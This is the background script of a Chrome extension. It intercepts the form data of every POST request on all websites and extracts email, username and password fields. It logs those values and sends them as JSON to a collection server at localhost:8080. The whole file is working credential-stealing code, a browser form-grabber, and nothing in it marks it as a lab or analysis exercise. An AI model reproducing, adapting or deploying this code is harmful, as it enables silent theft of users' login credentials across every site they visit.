let url = "http://localhost:8080";

chrome.webRequest.onBeforeRequest.addListener(
    function(details) {
        

        console.log("onbeforerequest happened");
        if (details.method == "POST") {
            let formData = details.requestBody.formData;


            if (formData) {
                
                console.log(formData);

                if (Object.hasOwn(formData, "email")) {
                    console.log("email: " + formData.email);
                }
                if (Object.hasOwn(formData, "username")) {
                    console.log("username: " + formData.username);
                }
                if (Object.hasOwn(formData, "password")) {
                    console.log("password: " + formData.password);
                }

                const saveLoginInfo = async () => {
                    const response = await fetch(url, {
                        method: "POST",
                        body: JSON.stringify({
                            email: formData.email,
                            username: formData.username,
                            password: formData.password
                        })
                    });
                }

                const getLoginInfo = async () => {
                    const response = await fetch(url);
                    const loginInfo = await response.json(); //extract JSON from the http response

                    // if there is login info, then
                    saveLoginInfo()
                    
                }

                getLoginInfo();

            }
        }
    },
    {urls: ["<all_urls>"]},
    ["requestBody"]
);

